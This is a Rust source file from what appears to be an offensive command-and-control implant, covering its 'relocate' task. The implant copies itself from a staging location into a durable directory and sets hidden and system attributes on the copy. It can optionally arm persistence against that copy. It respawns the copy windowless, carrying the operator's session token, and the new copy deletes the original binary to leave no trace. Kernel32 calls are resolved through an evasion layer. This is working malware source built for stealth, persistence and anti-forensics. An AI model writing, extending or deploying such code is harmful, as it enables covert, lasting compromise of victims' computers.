//! Self-install relocation (ABR-T040): the operational answer to "the
//! implant just landed — now what?". A stage dropped in a loud location
//! (Downloads, %TEMP%, a staged upload) copies itself to a durable,
//! boring home, optionally arms a persistence mechanism against the NEW
//! copy, and when `respawn` is set, starts that copy and exits — the
//! respawned beacon deletes the staging binary on its first successful
//! link, closing the loop: stage -> relocate -> resident copy + survival
//! + no stage left behind.
//!
//! Continuity of the operator's session is the load-bearing detail: the
//! respawn is launched with the CURRENT session token in the
//! environment (`ABRAHAM_RESUME`), so the teamserver resumes the same
//! session (id, queued tasks, results) instead of opening a sibling —
//! relocation reads as a transport drop, not a new implant. The old
//! image path rides along (`ABRAHAM_OLDPATH`) for the hygiene delete.
//!
//! Everything runs in-process on the session thread: the copy is
//! std::fs, the attributes and spawn are kernel32 resolved on demand
//! (CreateProcessW under std's hood — no shell, no cmd.exe), and the
//! spawn is non-blocking so the ekko single-thread invariant holds.

// Same on-demand FFI transmute idiom as persist.rs (see the note there).
#![allow(clippy::missing_transmute_annotations)]

use crate::evasion::syscalls;
use crate::message::persist_action;

/// Set on a relocation respawn; hex of the session token the new beacon
/// must resume instead of minting.
pub const ENV_RESUME: &str = "ABRAHAM_RESUME";
/// Set on a relocation respawn; staging binary the new beacon deletes
/// after its first successful link.
pub const ENV_OLD_PATH: &str = "ABRAHAM_OLDPATH";

const FILE_ATTRIBUTE_HIDDEN: u32 = 0x2;
const FILE_ATTRIBUTE_SYSTEM: u32 = 0x4;
const CREATE_NO_WINDOW: u32 = 0x0800_0000;

pub struct Outcome {
    pub report: Vec<u8>,
    /// True when the copy was spawned and the caller must exit after
    /// delivering the result.
    pub exit: bool,
}

/// Parses a hex session token handed over by a relocation respawn.
pub fn resume_token() -> Option<u64> {
    let text = std::env::var(ENV_RESUME).ok()?;
    u64::from_str_radix(text.trim(), 16).ok()
}

/// Entry point of the RELOCATE task. `forward_args` are this process's
/// own arguments (lab builds carry --server/--key style flags the copy
/// needs verbatim; operational builds have none).
pub fn stage(
    dir: &str,
    name: &str,
    persist: &str,
    respawn: bool,
    token: u64,
    forward_args: &[String],
) -> Result<Outcome, String> {
    if dir.is_empty() {
        return Err("relocate requires a destination directory".into());
    }
    if !valid_name(name) {
        return Err("relocate name must be [A-Za-z0-9_.-]+ with no path separators".into());
    }
    let source = crate::persist::self_path()?;
    let target = format!(r"{}\{name}", dir.trim_end_matches('\\'));
    if source.eq_ignore_ascii_case(&target) {
        return Err(format!("already running from {target}"));
    }

    std::fs::create_dir_all(dir).map_err(|e| format!("create {dir}: {e}"))?;
    std::fs::copy(&source, &target).map_err(|e| format!("copy {source} -> {target}: {e}"))?;
    set_hidden_system(&target);
    let mut report = format!("relocate: {source} -> {target} (hidden+system)");

    if !persist.is_empty() {
        // The mechanism's `name` is the registry value / service name:
        // the file stem, not the file name.
        let stem = name.trim_end_matches(".exe");
        let out = crate::persist::stage(persist_action::INSTALL, persist, stem, &target, "")
            .map_err(|e| format!("persist {persist} against {target}: {e}"))?;
        report.push_str(&format!(
            "\npersist: {}",
            String::from_utf8_lossy(&out).trim_end()
        ));
    }

    if !respawn {
        return Ok(Outcome {
            report: report.into_bytes(),
            exit: false,
        });
    }

    let mut command = std::process::Command::new(&target);
    command
        .args(forward_args)
        .env(ENV_RESUME, format!("{token:016x}"))
        .env(ENV_OLD_PATH, &source);
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        command.creation_flags(CREATE_NO_WINDOW);
    }
    let child = command
        .spawn()
        .map_err(|e| format!("respawn {target}: {e}"))?;
    report.push_str(&format!(
        "\nrespawn: pid {} from {target}, exiting; stage {source} deletes on first link",
        child.id()
    ));
    Ok(Outcome {
        report: report.into_bytes(),
        exit: true,
    })
}

/// File name only: alphanumeric plus `._-`, so `name` cannot walk the
/// path (`..\..\x`, `C:`, UNC) and lands exactly inside `dir`.
fn valid_name(name: &str) -> bool {
    !name.is_empty()
        && name.len() <= 64
        && name
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '_' || c == '-')
        && name != "."
        && name != ".."
}

fn set_hidden_system(path: &str) {
    let set: Option<unsafe extern "system" fn(*const u16, u32) -> i32> = unsafe {
        syscalls::export_address("kernel32.dll", "SetFileAttributesW")
            .map(|addr| std::mem::transmute(addr))
    };
    let Some(set) = set else { return };
    let wide: Vec<u16> = path.encode_utf16().chain(std::iter::once(0)).collect();
    unsafe { set(wide.as_ptr(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM) };
}

/// Hygiene delete of the staging binary, run by the RESPAWNED copy after
/// its first successful link: by then the old process has exited (it
/// exits immediately after the spawn result), so the image is unlocked.
/// Failure is silent by design — a locked or already-gone stage means
/// someone else's race, and the resident copy keeps beaconing either way.
pub fn cleanup_old_path(old: &str) -> Option<String> {
    let current = crate::persist::self_path().ok()?;
    if old.is_empty() || old.eq_ignore_ascii_case(&current) {
        return None;
    }
    match std::fs::remove_file(old) {
        Ok(()) => Some(old.to_string()),
        Err(_) => None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn names_cannot_walk_the_path() {
        assert!(valid_name("Sysnet.exe"));
        assert!(valid_name("svc-helper_2.vbs.exe"));
        assert!(!valid_name(""));
        assert!(!valid_name("..\\..\\evil.exe"));
        assert!(!valid_name("C:\\Windows\\evil.exe"));
        assert!(!valid_name("sub/dir.exe"));
        assert!(!valid_name("."));
        assert!(!valid_name(".."));
        assert!(!valid_name(&"a".repeat(65)));
    }

    #[test]
    fn resume_token_parses_hex() {
        // Not set in the test environment: the None path is the default.
        assert!(resume_token().is_none());
    }
}
